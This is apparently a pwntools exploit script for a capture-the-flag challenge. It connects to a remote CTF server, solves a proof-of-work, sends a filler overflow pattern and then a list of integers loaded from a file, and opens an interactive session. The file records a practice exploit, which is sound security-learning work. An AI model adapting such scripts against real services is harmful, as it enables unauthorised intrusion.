from pwn import *
import subprocess

elf = ELF('./chal')
p = remote('kctf.rozdzka.securing.pl', 30001)

data = p.recvuntil("pow) solve ")
data = p.recvline().decode().strip()
print(' '.join(['python', 'pow.py', 'solve', data]))
res = subprocess.check_output(['python3', 'pow.py', 'solve', data])
p.sendline(res)
print(p.clean())

p.sendline(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB')

numbers = open('./numbers.txt', 'rt').read().strip().split(' ')
numbers = list(map(int, numbers))

print(len(numbers))
for n in numbers[1:]:
    p.sendline(str(n))

p.interactive()
